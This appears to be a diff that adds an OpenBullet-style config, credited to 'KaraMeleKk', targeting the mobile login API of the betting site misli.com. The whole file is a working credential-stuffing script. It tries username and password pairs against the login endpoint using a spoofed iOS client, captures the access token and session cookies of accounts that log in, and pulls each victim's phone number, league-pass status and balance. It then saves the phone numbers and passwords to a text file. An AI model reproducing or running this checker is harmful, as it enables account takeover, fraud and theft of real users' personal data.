@@ -1,0 +1,104 @@
+[SETTINGS]
+{
+  "Name": "iOS Api Misli.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-06T16:20:29.3560574+03:00",
+  "AdditionalInfo": "",
+  "Author": "KaraMeleKk",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://apivx.misli.com/api/mobile/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "channel-type: IOS" 
+  HEADER "Host: apivx.misli.com" 
+  HEADER "User-Agent: Misli.com/1252 CFNetwork/1329 Darwin/21.3.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+
+PARSE "<SOURCE>" JSON "accessToken" -> VAR "token1" 
+
+PARSE "<COOKIES(TS0161afd5)>" LR "" "" -> VAR "ts1" 
+
+PARSE "<COOKIES(TS0161afd5030)>" LR "" "" -> VAR "ts2" 
+
+REQUEST GET "https://apivx.misli.com/api/mobile/v1/user/info" 
+  
+  HEADER "Authorization: Bearer <token1>" 
+  HEADER "channel-type: IOS" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Cookie: TS0161afd5=<ts1>; TS0161afd5030=<ts2>" 
+  HEADER "Host: apivx.misli.com" 
+  HEADER "User-Agent: Misli.com/1252 CFNetwork/1329 Darwin/21.3.0" 
+
+PARSE "<SOURCE>" JSON "mobileNumber" CreateEmpty=FALSE -> CAP "Telefon" 
+
+PARSE "<SOURCE>" LR "\"hasLeaguePass\":" "," -> VAR "ligpass" 
+
+FUNCTION Translate 
+  KEY "false" VALUE "❌" 
+  KEY "true" VALUE "✔️" 
+  "<ligpass>" -> CAP "Lig Pass" 
+
+REQUEST GET "https://apivx.misli.com/api/mobile/v1/user/balance" 
+  
+  HEADER "Authorization: Bearer <token1>" 
+  HEADER "channel-type: IOS" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Cookie: TS0161afd5=<ts1>; TS0161afd5030=<ts2>" 
+  HEADER "Host: apivx.misli.com" 
+  HEADER "User-Agent: Misli.com/1252 CFNetwork/1329 Darwin/21.3.0" 
+
+PARSE "<SOURCE>" LR "\"amount\":" "," CreateEmpty=FALSE -> CAP "Bakiye" 
+
+UTILITY File "Misli Telpass.txt" AppendLines "<Telefon>:<PASS>" 
+
